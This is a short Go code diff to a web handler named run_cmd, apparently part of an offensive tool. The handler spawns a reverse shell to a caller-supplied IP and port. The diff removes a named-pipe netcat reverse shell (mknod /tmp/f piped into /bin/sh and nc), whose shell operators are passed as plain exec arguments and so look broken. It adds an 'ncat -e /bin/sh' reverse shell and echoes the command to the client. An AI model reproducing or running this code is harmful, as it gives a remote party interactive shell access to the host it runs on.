@@ -328,8 +328,8 @@ func run_cmd(w http.ResponseWriter, r *http.Request, cmd_opt string) {
 		ctx, cancel := context.WithTimeout(context.Background(), ctx_duration)
 		defer cancel()
 
-		cmd_out, err := exec.CommandContext(ctx, "rm", "-f", "/tmp/f", ";", "mknod", "/tmp/f", "p", ";", "cat", "/tmp/f", "|", "/bin/sh", "-i", "2>&1", "|", "nc", dest_ip, tcp_port, ">", "/tmp/f").Output()
-		fmt.Fprintf(w, "Running command \"rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s "+"> /tmp/f\"\n", dest_ip, tcp_port)
+		cmd_out, err := exec.CommandContext(ctx, "ncat", "-e /bin/sh", dest_ip, tcp_port).Output()
+		fmt.Fprintf(w, "Running command \"ncat -e /bin/sh %s %s\"\n", dest_ip, tcp_port)
 		if err == nil {
 			fmt.Fprintf(w, "%s\n", cmd_out)
 		} else {
